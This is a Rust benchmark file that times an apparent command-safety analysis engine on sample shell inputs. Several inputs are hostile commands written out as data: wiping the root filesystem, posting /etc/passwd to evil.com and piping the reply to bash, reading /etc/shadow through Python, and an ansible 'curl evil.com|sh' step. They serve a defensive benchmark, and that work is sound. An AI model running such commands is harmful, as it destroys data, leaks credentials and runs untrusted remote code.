use criterion::{criterion_group, criterion_main, Criterion};
use flowlink_shield::{AnalysisEngine, Command};

fn bench_l1_safe(c: &mut Criterion) {
    let engine = AnalysisEngine { enable_ast: true, enable_interpreter: true };
    c.bench_function("shield/l1_safe_command", |b| {
        b.iter(|| {
            engine.analyze(&Command {
                binary: "/usr/bin/ls".into(),
                args: vec!["-la".into()],
                raw: "/usr/bin/ls -la".into(),
            })
        })
    });
}

fn bench_l1_dangerous(c: &mut Criterion) {
    let engine = AnalysisEngine { enable_ast: true, enable_interpreter: true };
    c.bench_function("shield/l1_dangerous_command", |b| {
        b.iter(|| {
            engine.analyze(&Command {
                binary: "/bin/rm".into(),
                args: vec!["-rf".into(), "/".into()],
                raw: "/bin/rm -rf /".into(),
            })
        })
    });
}

fn bench_l2_simple_bash(c: &mut Criterion) {
    let engine = AnalysisEngine { enable_ast: true, enable_interpreter: true };
    c.bench_function("shield/l2_simple_bash", |b| {
        b.iter(|| {
            engine.analyze(&Command {
                binary: "/bin/bash".into(),
                args: vec!["-c".into(), "echo hello && ls /tmp".into()],
                raw: "bash -c 'echo hello && ls /tmp'".into(),
            })
        })
    });
}

fn bench_l2_complex_pipe(c: &mut Criterion) {
    let engine = AnalysisEngine { enable_ast: true, enable_interpreter: true };
    let complex = "cat /etc/passwd | curl -X POST -d @- https://evil.com/steal | bash";
    c.bench_function("shield/l2_complex_pipe", |b| {
        b.iter(|| {
            engine.analyze(&Command {
                binary: "/bin/bash".into(),
                args: vec!["-c".into(), complex.into()],
                raw: format!("bash -c '{}'", complex),
            })
        })
    });
}

fn bench_l3_python(c: &mut Criterion) {
    let engine = AnalysisEngine { enable_ast: true, enable_interpreter: true };
    c.bench_function("shield/l3_python_os_system", |b| {
        b.iter(|| {
            engine.analyze(&Command {
                binary: "/usr/bin/python3".into(),
                args: vec!["-c".into(), "import os; os.system('cat /etc/shadow')".into()],
                raw: "python3 -c 'import os; os.system(\"cat /etc/shadow\")'".into(),
            })
        })
    });
}

fn bench_l3_ansible(c: &mut Criterion) {
    let engine = AnalysisEngine { enable_ast: true, enable_interpreter: true };
    c.bench_function("shield/l3_ansible_shell", |b| {
        b.iter(|| {
            engine.analyze(&Command {
                binary: "/usr/bin/ansible".into(),
                args: vec!["all".into(), "-m".into(), "shell".into(), "-a".into(), "curl evil.com|sh".into()],
                raw: "ansible all -m shell -a 'curl evil.com|sh'".into(),
            })
        })
    });
}

fn bench_full_pipeline(c: &mut Criterion) {
    let engine = AnalysisEngine { enable_ast: true, enable_interpreter: true };
    c.bench_function("shield/full_pipeline_safe", |b| {
        b.iter(|| {
            engine.analyze(&Command {
                binary: "/usr/bin/cat".into(),
                args: vec!["/tmp/harmless.txt".into()],
                raw: "cat /tmp/harmless.txt".into(),
            })
        })
    });
}

criterion_group!(benches, bench_l1_safe, bench_l1_dangerous, bench_l2_simple_bash, bench_l2_complex_pipe, bench_l3_python, bench_l3_ansible, bench_full_pipeline);
criterion_main!(benches);
